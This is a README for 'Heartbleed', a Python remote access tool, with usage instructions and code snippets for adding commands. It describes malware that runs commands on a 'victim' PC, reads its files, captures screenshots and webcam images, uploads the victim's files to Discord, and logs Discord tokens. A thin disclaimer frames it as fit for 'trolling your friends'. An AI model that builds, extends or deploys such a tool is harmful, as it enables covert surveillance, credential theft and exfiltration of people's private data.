# 🩸 Heartbleed
 ## Advanced remote access tool

 Don't use for malicious reasons.
 You can use it for reasons such as trolling your friends or learning from the code.

Usage: python Server.py {ip} {port},
Example: python Server.py 127.0.0.1 8080.

Client listens to 127.0.0.1:8080 by default. You can always change this.
Server connects to given ip & port. Also has discord token logger.

        ===> Commands <===

            "1": Used to view folders in specified directory.
            "2": Used to send message box with message and title and get response.
            "3": Execute Windows commands.
            "4": View content of readable text files.
            "5": Execute a link in web browser.
            "6": Execute hotkey.
            "7": Execute CMD commands.
            "8": Take screenshot of victim PC and send to discord.
            "9": Take shot of victim webcam and send to discord.
            "10": Upload files of victim and send to discord. (upto 7mb).

You can always add more commands if you like.

# To add a command (Server.py)
Inside of the function, commandHQ() just below the command variable write the following code

```Python
if command == "{number}":
    try:
        argument = input(format + "Enter argument: ") # Use this if you need an argument
        message = str(["{name}", argument or ""])
        message = message.encode()
        conn.send(message)
        ans = True
    except:
        reload()
```

Now just below the incoming_message variable write the following code:

```Python
if incoming_message[0] == "{name}":
    print(format + "Data received: {}".format(incoming_message[1]))
```

Replace {number} with your command prefix & replace {name} with your command name.

# To add a command (Client.py)
Inside of the while loop, just below the incoming_message variable write the folling code

```Python
if incoming_message[0] == "{name}":
     # Write your code
    code = ""
    end = str(['sfisd', code])
    end = end.encode()
    s.send(end)
```

Replace {name} with your command name and make sure to set variable code's value to your function's end product.

# Example of Usage

  <img align="left" alt="PNG" src="https://raw.githubusercontent.com/xTornaido/Heartbleed/master/images/example.png" width="961" height="320" />

# The End.

That's the end!
